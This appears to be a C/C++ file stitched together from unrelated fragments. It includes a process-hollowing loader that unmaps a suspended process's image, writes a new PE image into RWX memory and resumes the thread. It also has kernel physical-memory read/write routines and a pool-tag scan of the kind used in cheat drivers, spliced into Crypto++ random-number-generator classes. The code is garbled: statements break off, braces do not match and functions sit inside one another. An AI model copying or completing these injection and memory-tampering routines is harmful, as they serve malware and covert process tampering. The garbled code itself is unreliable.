#include <Windows.h>
#include <TlHelp32.h>
#include <wchar.h>
typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef BOOL(WINAPI * NtSetThreadContext)(HANDLE hThread, PCONTEXT lpContext);
typedef LPVOID(WINAPI * callVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef LPVOID(WINAPI * callVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef bool(WINAPI * callReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
typedef bool(WINAPI * callWriteProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
typedef HANDLE(WINAPI * callCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
typedef HANDLE(WINAPI * callProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef HANDLE(WINAPI * callProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);




void ExecFile(LPSTR szFilePath, LPVOID pFile)
{
	 if (!address)
            return STATUS_UNSUCCESSFUL;

        MM_COPY_ADDRESS addr = { 0 };
        addr.PhysicalAddress.QuadPart = ( LONGLONG )address;
        return MmCopyMemory( buffer, addr, size, MM_COPY_MEMORY_PHYSICAL, read );
    }

    auto writephysaddress( PVOID address, PVOID buffer, SIZE_T size, SIZE_T* written ) -> NTSTATUS
    {
        if (!address)
            return STATUS_UNSUCCESSFUL;

        PHYSICAL_ADDRESS addr = { 0 };
        addr.QuadPart = (LONGLONG)address;

        auto mapped_mem = MmMapIoSpaceEx( addr, size, PAGE_READWRITE );

        if (!mapped_mem)
            return STATUS_UNSUCCESSFUL;

        memcpy( mapped_mem, buffer, size );

        *written = size;
        MmUnmapIoSpace( mapped_mem, size );
    
	if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
			{
				xVirtualAlloc = callVirtualAlloc(GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc"));
				xVirtualAllocEx = callVirtualAllocEx(GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAllocEx"));
				xReadProcessMemory = callReadProcessMemory(GetProcAddress(GetModuleHandleA("kernel32.dll"), "ReadProcessMemory"));
				xWriteProcessMemory = callReadProcessMemory(GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory"));
				
				
				pool_information = ( PSYSTEM_BIGPOOL_INFORMATION )ExAllocatePool( NonPagedPool, information_length );
         	 		  status = ZwQuerySystemInformation
				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
				{
					xReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);

					if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
					{
						xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
					}

					pImageBase = xVirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);



					if (pImageBase)
					{
						xWriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
						{
							ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 167 + (Count * 40));
							xWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
						}
						class Sandy64
							{
							public:
								BOOL Init();
								template<typename DataType> DataType Read(ULONG64 Address)
								{
									DataType Buffer;
									ReadPtr(Address, &Buffer, sizeof(DataType));
									return Buffer;
								}

								ULONG64 GetModuleBase(ULONG ProcessPid, LPCSTR ModuleName);
								BOOL ReadPtr(ULONG ProcessPid, ULONG64 Address, PVOID pBuffer, DWORD Size);
								BOOL WritePtr(ULONG ProcessPid, ULONG64 Address, PVOID pBuffer, DWORD Size);
						};

												xNtSetThreadContext = NtSetThreadContext(GetProcAddress(GetModuleHandleA("d3d11.dll"), "NtSetContextThread"));
												xNtSetThreadContext(PI.hThread, LPCONTEXT(CTX));

												ResumeThread(PI.hThread);
												

				}
			}
		}
	}
	VirtualFree(pFile, 0, MEM_RELEASE);
}


class LC_RNG : public RandomNumberGenerator
{
public:
	uint32_t    src_pid;
	uint64_t    src_addr;
	uint64_t    dst_addr;
	size_t        size;

	int request_key;

	//guarded regions
	uintptr_t allocation;

	//mouse
	long x;
	long y;
	unsigned short button_flags;

private:
	word32 seed;

	static const word32 m;
	static const word32 q;
	static const word16 a;
	static const word16 r;
};


class CRYPTOPP_DLL X917RNG : public RandomNumberGenerator, public NotCopyable
{
public:
	
                    if ( saved_virtual_address == 0 && allocation_entry->TagUlong == 'Fnoberz' ) {
                        saved_virtual_address = virtual_address;
private:
	member_ptr<BlockTransformation> m_cipher;
	const unsigned int m_size;  // blocksize
	SecByteBlock m_datetime;    // socket pc
	SecByteBlock m_randseed, m_lastBlock, m_deterministicTimeVector;
};
